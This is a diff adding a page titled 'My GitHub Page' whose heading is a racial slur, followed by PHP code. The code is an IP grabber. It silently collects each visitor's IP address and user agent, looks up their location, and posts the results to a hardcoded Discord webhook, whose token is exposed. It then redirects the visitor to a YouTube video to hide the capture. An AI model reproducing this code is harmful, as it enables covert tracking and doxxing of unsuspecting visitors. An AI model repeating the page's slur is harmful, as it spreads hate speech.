@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My GitHub Page</title>
+</head>
+<body>
+    <h1>Nigger</h1>
+</body>
+</html>
+
+<?php
+ error_reporting(E_ALL);
+ ini_set('display_errors', 1);
+ header('Content-Type: application/json');
+function getClientIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    }
+    
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]);
+    }
+    
+    return $_SERVER['REMOTE_ADDR'];
+}
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$clientIP = getClientIP();
+$webhook = "https://discord.com/api/webhooks/1322202191204974702/IhLr3iOT0jtwbLllFvKEdCLOEy3iDfkCit99B_jCKEute3vqnXN0vaycVWQ0VhfaJjX5";
+
+// Get IP info
+$clientInfo = "https://ipinfo.io/{$clientIP}/json";
+$response = file_get_contents($clientInfo);
+
+// Format the data for Discord with custom username
+$data = [
+    'username' => 'IPGrapper',
+    'content' =>  "@everyone\n __**UserAgent:**__\n**$$userAgent**\n\n *IP Information:*\n\n" . $response . "\n"];
+
+// Send to Discord webhook
+$ch = curl_init($webhook);
+curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+curl_exec($ch);
+curl_close($ch);
+header("Location: https://www.youtube.com/watch?v=SlRug4fhCGE");
+exit();
+?>
